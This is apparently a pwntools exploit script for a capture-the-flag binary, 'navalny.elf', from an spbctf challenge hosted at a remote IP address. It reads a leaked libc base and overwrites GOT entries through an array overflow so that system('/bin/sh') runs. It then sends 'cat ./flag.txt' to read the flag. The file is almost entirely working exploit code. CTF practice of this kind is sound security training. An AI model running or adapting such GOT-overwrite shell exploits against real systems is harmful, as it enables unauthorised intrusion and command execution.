#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./navalny.elf --host 109.233.56.90 --port 11625
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./navalny.elf')

if exe.bits == 32:
    lindbg = "/root/linux_server"
else:
    lindbg = "/root/linux_server64"


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11625)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(['qira', exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

libc = ELF('libc-2.31.so')
# got_libc_addr = 0x4034C8
array_addr = 0x4032D8
got_plt_puts_addr = 0x4034F8
got_plt_system_addr = 0x403508

io = start()
io.recvuntil("rw-p 00000000 00:00 0")
io.recvline()
LIBC_base = int(io.recvline()[:12],16)
log.info(f"Libc pointer = {hex(LIBC_base)}")
system_pointer = LIBC_base + libc.symbols['system']
log.info(f"System pointer {hex(system_pointer)}, {hex(libc.symbols['system'])}")
printf_pointer = LIBC_base + libc.symbols['printf']
log.info(f"Printf pointer {hex(printf_pointer)}, {hex(libc.symbols['printf'])}")
puts_pointer = LIBC_base + libc.symbols['puts']
log.info(f"Puts pointer {hex(puts_pointer)}, {hex(libc.symbols['puts'])}")
__stack_chk_fail_pointer = LIBC_base + libc.symbols["__stack_chk_fail"]
log.info(f"Canary_check pointer {hex(__stack_chk_fail_pointer)}, {hex(libc.symbols['__stack_chk_fail'])}")
gets_pointer = LIBC_base + libc.symbols['gets']

log.info("**********************\n* Please wait 10 sec *\n**********************")

io.recvuntil("Quick! Shout something:")
pl = cyclic(got_plt_puts_addr - array_addr)
pl += p64(puts_pointer)
pl += p64(__stack_chk_fail_pointer)
pl += p64(printf_pointer)
pl += p64(printf_pointer)
pl += p64(gets_pointer)
io.sendline(pl) 


io.recvuntil("Now you can do whatever you want: ")
pl = b"/bin/sh\x00"

pl += cyclic(got_plt_puts_addr - array_addr - len(pl))
pl += p64(puts_pointer) #+ b"\x00"
pl += p64(__stack_chk_fail_pointer) #+ b"\x00"
pl += p64(system_pointer)
pl += p64(printf_pointer)
pl += p64(gets_pointer)
# pl += p64(GETS)
# pl += p64(printf_pointer)
io.sendline(pl)
io.sendline("cat ./flag.txt")
io.recvuntil("spbctf")
flag = io.recvuntil("}").decode()
log.success(f"Flag: spbctf{flag}")

io.close()

